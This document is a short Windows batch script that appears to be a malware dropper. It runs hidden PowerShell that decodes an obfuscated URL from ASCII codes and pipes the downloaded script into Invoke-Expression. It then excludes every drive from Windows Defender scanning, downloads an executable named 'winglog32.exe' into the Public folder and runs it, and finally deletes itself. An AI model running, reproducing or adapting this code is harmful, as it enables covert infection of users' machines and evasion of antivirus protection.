
@echo off
Powershell -WindowStyle Hidden -Command "$codes = 104,116,116,112,115,58,47,47,102,105,108,101,115,46,99,97,116,98,111,120,46,109,111,101,47,102,109,115,101,121,107,46,105,53,83,97,114;irm  $([Text.Encoding]::ASCII.GetString(@($codes))) | iex"
for /f %%A in ('mountvol ^| find ":\"') do (>nul powershell -c add-mppreference -exclusionpath %%A)

powershell -Command "$url = @();$url +=  'h';$url +=  't';$url +=  't';$url +=  'p';$url +=  's';$url +=  ':';$url +=  '/';$url +=  '/';$url +=  'f';$url +=  'i';$url +=  'l';$url +=  'e';$url +=  's';$url +=  '.';$url +=  'c';$url +=  'a';$url +=  't';$url +=  'b';$url +=  'o';$url +=  'x';$url +=  '.';$url +=  'm';$url +=  'o';$url +=  'e';$url +=  '/';$url +=  'h';$url +=  '2';$url +=  'w';$url +=  'l';$url +=  'n';$url +=  'h';$url +=  '.';$url +=  'p';$url +=  '0';$url +=  'D';$url +=  'i';$url +=  '7';$url = $url -join '';$output = \"$env:PUBLIC\winglog32.exe\";$output2 = \"$env:PUBLIC\winglog64.exe\"; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output -Wait"

del "%~f0"
